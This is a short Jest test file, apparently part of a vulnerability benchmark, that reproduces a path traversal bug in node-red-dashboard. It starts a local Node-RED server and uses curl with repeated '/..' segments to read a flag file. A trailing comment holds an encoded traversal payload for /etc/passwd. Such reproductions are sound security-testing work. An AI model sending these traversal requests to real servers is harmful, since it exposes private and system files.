//https://github.com/node-red/node-red-dashboard/issues/669
const path = require("path");
const { sleep } = require("sleep");
const pathToFlag = path.resolve(__dirname, "../flag.html");

function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}

test("Path Traversal in http_server", (done) => {
    const fs = require("fs");
    const sleep =require('sleep');
    const { exec } = require("child_process");
    let hostsFile = fs.readFileSync(pathToFlag).toString();

    let server = 'nodejs node_modules/node-red/red.js'; //to start the server
    exec(server, (error, stdout) => {});//starting the server

    sleep.sleep(2);
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:1880${genstr()}"`;

    exec(attack_string, (error, stdout) => {//attack
    expect(stdout).toBe(hostsFile);
    done();
    });
});

//curl "127.0.0.1:1880/ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
//nodejs node_modules/node-red/red.js